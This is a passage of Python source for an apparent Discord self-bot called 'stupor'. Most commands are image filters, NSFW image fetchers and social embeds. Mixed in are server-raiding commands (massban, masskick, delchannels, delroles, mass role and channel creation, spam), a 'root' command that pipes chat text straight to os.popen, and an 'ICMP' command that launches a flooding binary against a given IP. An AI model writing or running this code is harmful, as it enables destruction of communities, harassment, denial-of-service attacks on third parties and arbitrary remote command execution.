                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_invert.png"))
            except:
                await ctx.send(endpoint)


    @stupor.command()
    async def communist(ctx, user: discord.Member = None):
        await ctx.message.delete()
        endpoint = "https://api.alexflipnote.dev/filter/communist?image="
        if user is None:
            avatar = str(ctx.author.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_invert.png"))
            except:
                await ctx.send(endpoint)
        else:
            avatar = str(user.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_invert.png"))
            except:
                await ctx.send(endpoint)


    @stupor.command()
    async def snow(ctx, user: discord.Member = None):
        await ctx.message.delete()
        endpoint = "https://api.alexflipnote.dev/filter/snow?image="
        if user is None:
            avatar = str(ctx.author.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_invert.png"))
            except:
                await ctx.send(endpoint)
        else:
            avatar = str(user.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_invert.png"))
            except:
                await ctx.send(endpoint)


    @stupor.command(aliases=["jpeg"])
    async def jpegify(ctx, user: discord.Member = None):
        await ctx.message.delete()
        endpoint = "https://api.alexflipnote.dev/filter/jpegify?image="
        if user is None:
            avatar = str(ctx.author.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_invert.png"))
            except:
                await ctx.send(endpoint)
        else:
            avatar = str(user.avatar_url_as(format="png"))
            endpoint += avatar
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(endpoint) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_invert.png"))
            except:
                await ctx.send(endpoint)


    @stupor.command(aliases=["pornhublogo", "phlogo"])
    async def pornhub(ctx, word1=None, word2=None):
        await ctx.message.delete()
        if word1 is None or word2 is None:
            await ctx.send("missing parameters")
            return
        endpoint = "https://api.alexflipnote.dev/pornhub?text={text-1}&text2={text-2}".replace("{text-1}", word1).replace(
            "{text-2}", word2)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"stupor_pornhub_logo.png"))
        except:
            await ctx.send(endpoint)


    @stupor.command(aliases=["pornhubcomment", 'phc'])
    async def phcomment(ctx, user: str = None, *, args=None):
        await ctx.message.delete()
        if user is None or args is None:
            await ctx.send("missing parameters")
            return
        endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
            ctx.author.avatar_url_as(format="png"))
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(res["message"]) as resp:
                    image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_pornhub_comment.png"))
        except:
            await ctx.send(res["message"])

    @stupor.command()
    async def tweet(ctx, username: str = None, *, message: str = None):
        await ctx.message.delete()
        if username is None or message is None:
            await ctx.send("missing parameters")
            return
        async with aiohttp.ClientSession() as cs:
            async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
                res = await r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"stupor_tweet.png"))
                except:
                    await ctx.send(res['message'])


    @stupor.command(aliases=["distort"])
    async def magik(ctx, user: discord.Member = None):
        await ctx.message.delete()
        endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
        if user is None:
            avatar = str(ctx.author.avatar_url_as(format="png"))
            endpoint += avatar
            r = requests.get(endpoint)
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_magik.png"))
            except:
                await ctx.send(res['message'])
        else:
            avatar = str(user.avatar_url_as(format="png"))
            endpoint += avatar
            r = requests.get(endpoint)
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"stupor_magik.png"))
            except:
                await ctx.send(res['message'])

    @stupor.command()
    async def massban(ctx):  
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass

    @stupor.command()
    async def masskick(ctx):  
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.kick()
            except:
                pass

    @stupor.command()
    async def massrole(ctx):  
        await ctx.message.delete()
        for _i in range(250):
            try:
                await ctx.guild.create_role(name=RandString(), color=RandomColor())
            except:
                return

    @stupor.command()
    async def masschannel(ctx):  
        await ctx.message.delete()
        for _i in range(250):
            try:
                await ctx.guild.create_text_channel(name=RandString())
            except:
                return

    @stupor.command()
    async def delchannels(ctx):  
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                return

    @stupor.command()
    async def delroles(ctx):  
        await ctx.message.delete()
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass

    @stupor.command()
    async def massunban(ctx):  
        await ctx.message.delete()
        banlist = await ctx.guild.bans()
        for users in banlist:
            try:
                await asyncio.sleep(2)
                await ctx.guild.unban(user=users.user)
            except:
                pass

    @stupor.command()
    async def feet(ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/feetg")
        res = r.json()
        em = discord.Embed()
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def hentai(ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
        res = r.json()
        em = discord.Embed()
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def neko(ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/neko")
        res = r.json()
        em = discord.Embed()
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def wallpaper(ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/wallpaper")
        res = r.json()
        em = discord.Embed()
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def boobs(ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/boobs")
        res = r.json()
        em = discord.Embed()
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def nsfwpfp(ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/nsfw_avatar")
        res = r.json()
        em = discord.Embed()
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def tits(ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/tits")
        res = r.json()
        em = discord.Embed()
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def blowjob(ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/blowjob")
        res = r.json()
        em = discord.Embed()
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def lewdneko(ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
        res = r.json()
        em = discord.Embed()
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def lesbian(ctx):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/les")
        res = r.json()
        em = discord.Embed()
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def feed(ctx, user):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/feed")
        res = r.json()
        em = discord.Embed(description=user + ' has been fed by ' + stupor.user.name)
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def tickle(ctx, user):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/tickle")
        res = r.json()
        em = discord.Embed(description=user + ' has been tickled by ' + stupor.user.name)
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def slap(ctx, user):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/slap")
        res = r.json()
        em = discord.Embed(description=user + ' has been slapped by ' + stupor.user.name)
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])

    @stupor.command()
    async def hug(ctx, user):  
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/hug")
        res = r.json()
        em = discord.Embed(description=user + ' has been hugged by ' + stupor.user.name)
        em.set_image(url=res['url'])
        if embedmode is True:
            await ctx.send(embed=em)
        else:
            await ctx.send(res['url'])


    @stupor.command()
    async def snipe(ctx):
        channel = ctx.channel
        try: 
            em = discord.Embed(timestamp=datetime.datetime.utcnow(), title=f"**__Sniped user:__**\n `{ctx.author.name}`", description=f"**Message sniped:**\n`{snipe_message_content[channel.id]}`", color=0x000000)
            if embedmode is True:
                await ctx.send(embed = em)
            else:
                await ctx.send(f'''```
Sniped user: {ctx.author.name}
Message sniped: {snipe_message_content[channel.id]}
                ```''')
        except:
            if embedmode is True:
                embed = discord.Embed(timestamp=datetime.datetime.utcnow(), title="**__ERROR__**", description=f"Nothing to snipe", color=0xFF0000)
                await ctx.send(embed=embed)
            else:
                await ctx.send("```Nothing to snipe```")
        del snipe_message_content[channel.id]
        del snipe_message_author[channel.id]

    @stupor.command()
    async def info(ctx):
        await ctx.message.delete()
        cpuavg = psutil.cpu_percent(interval=None)
        mem = psutil.virtual_memory()[2]
        uname = platform.uname()
        uptime = datetime.datetime.utcnow() - start_time
        uptime = str(uptime).split('.')[0]
        embed = discord.Embed(color=0x000000)
        embed.add_field(name="Server info", value=f'''
**CPU:** {cpuavg}%
**RAM:** {mem}%
**PING:** {round(stupor.latency * 1000)}ms
**UPTIME:** {uptime}
        ''')
        if embedmode is True:
            await ctx.send(embed=embed)
        else:
            await ctx.send(f'''```
Server info
CPU: {cpuavg}%
RAM: {mem}%
PING: {round(stupor.latency * 1000)}ms
UPTIME: {uptime}```''')


    @stupor.command()
    async def whois(ctx, *, user: discord.Member = None):
        await ctx.message.delete()
        if user is None:
            user = ctx.author
        date_format = "%a, %d %b %Y %I:%M %p"
        join = user.joined_at.strftime(date_format)
        reg = user.created_at.strftime(date_format)
        ID1 = user.id
        embed = discord.Embed(color=0x000000)
        embed.add_field(name=f"{user}", value=f'''
**Registered:** {reg}
**Joined:** {join}
**User ID:** {ID1}
        ''', inline=False)
        if embedmode is True:
            await ctx.send(embed=embed)
        else:
            await ctx.send(f'''```
{user}
Registered: {reg}
Joined: {join}
User ID: {ID1}```''')

    @stupor.command()
    async def spam(ctx, amount: int, *, message):
        await ctx.message.delete()
        for _i in range(amount):
            await ctx.send(message)

    @stupor.command()
    async def purge(ctx, amount: int):
        await ctx.message.delete()
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == stupor.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
                pass

#crashes a lot
    @stupor.command()
    async def root(ctx, *, arg1):
        a  = os.popen(arg1).readlines()
        embed = discord.Embed(color=0x000000)
        embed.add_field(name="root usage:", value=a, inline=False)
        if embedmode is True:
            await ctx.send(embed=embed)
        else:
            await ctx.send(f"```{a}```")

    @stupor.command()
    async def ICMP(ctx, ip, time):
        await ctx.message.delete()
        if time == 'bypass':
            os.system(f"nohup ./icmp3 {ip} &")
            em = discord.Embed(title="ICMP", description=f"active on {ip} until manual stop", color=0x000000)
            if embedmode is True:
                await ctx.send(embed=em)
            else:
                await ctx.send(f'''```
ICMP active on {ip} until manual stop```''')
        else:
            os.system(f"timeout {time} nohup ./icmp3 {ip} &")
            embed = discord.Embed(title="ICMP", description=f"active on {ip} for {time} seconds", colour=0x000000)
            if embedmode is True:
                await ctx.send(embed=embed)
            else:
                await ctx.send(f'''```
ICMP active on {ip} for {time} seconds```''')

    @stupor.command()
    async def minesweeper(ctx, size: int = 5):
        await ctx.message.delete()
        size = max(min(size, 8), 2)
        bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
        is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
        has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
        message = "\n"
        for y in range(size):
            for x in range(size):
                tile = "||{}||".format(chr(11036))
                if has_bomb(x, y):
                    tile = "||{}||".format(chr(128163))
                else:
                    count = 0
                    for xmod, ymod in m_offets:
                        if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                            count += 1
                    if count != 0:
                        tile = "||{}||".format(m_numbers[count - 1])
                message += tile
            message += "\n"
            embed = discord.Embed(title="Minesweeper", description=message, color=0x000000)
            if embedmode is True:
                await ctx.send(embed=embed)
            else:
                await ctx.send(f"{message}")


    stupor.run(token)

bot()